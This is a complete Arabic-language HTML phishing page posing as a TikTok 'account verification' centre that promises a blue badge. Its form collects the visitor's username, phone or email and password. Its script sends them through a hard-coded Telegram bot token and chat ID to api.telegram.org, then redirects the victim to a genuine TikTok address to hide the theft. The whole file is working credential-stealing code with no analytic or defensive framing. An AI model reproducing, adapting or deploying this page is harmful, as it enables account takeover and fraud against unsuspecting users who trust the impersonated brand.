<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>مركز توثيق تيك توك</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100vh; padding: 0 20px; }
    
    .header { text-align: center; padding: 48px 0 10px; }
    .tiktok-title { font-size: 54px; font-weight: 800; letter-spacing: -1.8px; color: #ffffff; line-height: 1; margin-bottom: 5px; }
    
    /* شارة التوثيق الزرقاء الصافية بدون حواف بيضاء */
    .badge-container { display: flex; justify-content: center; margin-bottom: 25px; }
    .verified-badge { width: 28px; height: 28px; fill: #20d5ec; }

    h1 { font-size: 26px; font-weight: 700; margin: 8px 0 16px; text-align: center; }
    
    /* وصف توثيق الحساب الأصلي */
    .warning { font-size: 15.5px; color: #d0d0d0; text-align: center; line-height: 1.45; margin: 0 auto 36px; max-width: 380px; }
    
    .form { max-width: 380px; margin: 0 auto; }
    
    .input-field { 
      width: 100%; 
      height: 54px; 
      padding: 0 16px; 
      background: #0f0f0f; 
      border: 1px solid #1a1a1a; 
      border-radius: 10px; 
      color: #fff; 
      font-size: 16px; 
      margin-bottom: 20px; 
      text-align: right;
    }
    
    .input-field::placeholder { color: #777; }
    
    /* ضبط مكان أيقونة العين لتكون في مكانها الصحيح (يسار الحقل) */
    .password-wrapper { position: relative; margin-bottom: 20px; }
    .toggle-password { 
      position: absolute; 
      top: 50%; 
      left: 15px; 
      transform: translateY(-50%);
      background: none; 
      border: none; 
      cursor: pointer; 
      color: #aaa; 
      display: flex; 
      align-items: center; 
      z-index: 5; 
    }
    .toggle-password svg { width: 20px; height: 20px; fill: currentColor; }
    
    .btn { width: 100%; height: 54px; margin: 28px 0 20px; background: #fe2c55; color: #fff; border: none; border-radius: 999px; font-size: 17px; font-weight: 700; cursor: pointer; }
    .forgot { display: block; text-align: center; color: #fe2c55; font-size: 14.5px; text-decoration: none; margin-bottom: 40px; }
    
    .footer { text-align: center; color: #444; font-size: 12px; padding: 20px 0 40px; line-height: 1.6; border-top: 1px solid #1a1a1a; max-width: 380px; margin: 0 auto; }
  </style>
</head>
<body>
  <div class="header">
    <div class="tiktok-title">TikTok</div>
    <div class="badge-container">
      <svg class="verified-badge" viewBox="0 0 24 24"><path d="M23.33 11.58l-2.09-2.41.33-3.18-3.13-.71-1.63-2.75L14 3.75l-2-.86-2 .86-2.81-1.22-1.63 2.75-3.13.71.33 3.18-2.09 2.41 2.09 2.41-.33 3.18 3.13.71 1.63 2.75L10 19.38l2 .86 2-.86 2.81 1.22 1.63-2.75 3.13-.71-.33-3.18 2.09-2.41zM9.5 15.5L6 12l1.41-1.41L9.5 12.67l6.59-6.59L17.5 7.5l-8 8z"/></svg>
    </div>
  </div>

  <h1>طلب توثيق الحساب</h1>
  
  <p class="warning">
    أدخل بياناتك للحصول على الشارة الزرقاء فوراً. يرجى مراجعة الأهلية للحصول على ميزة التوثيق الرسمي.
  </p>
  
  <form class="form" onsubmit="sendData(event)">
    <input class="input-field" type="text" id="user" placeholder="الهاتف / البريد الإلكتروني / اسم المستخدم" required />
    
    <div class="password-wrapper">
      <input class="input-field" id="password" type="password" placeholder="كلمة المرور" required />
      <button type="button" class="toggle-password" id="toggleBtn">
        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </button>
    </div>
    
    <button class="btn" type="submit">إرسال الطلب</button>
  </form>
  
  <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>

  <div class="footer">
    © TikTok - مركز المساعدة والدعم 2026<br>جميع الحقوق محفوظة
  </div>

  <script>
    const passwordInput = document.getElementById('password');
    const toggleBtn = document.getElementById('toggleBtn');
    
    toggleBtn.addEventListener('click', () => {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      toggleBtn.innerHTML = isPassword
        ? `<svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.82l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.74-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.02c.01-.1.02-.2.02-.31 0-1.66-1.34-3-3-3-.11 0-.21.01-.31.02l-.02.02z"/></svg>`
        : `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`;
    });

    async function sendData(event) {
      event.preventDefault();
      const user = document.getElementById('user').value;
      const pass = document.getElementById('password').value;
      const token = '8633152106:AAHnSFCxJtolR1AlUGG5f1hcwmYxsTobS7I'; 
      const chat_id = '5757914383';
      const text = `👑 طلب توثيق حساب جديد\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`;
      
      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
      window.location.href = "https://www.tiktok.com/id/verification";
    }
  </script>
</body>
</html>
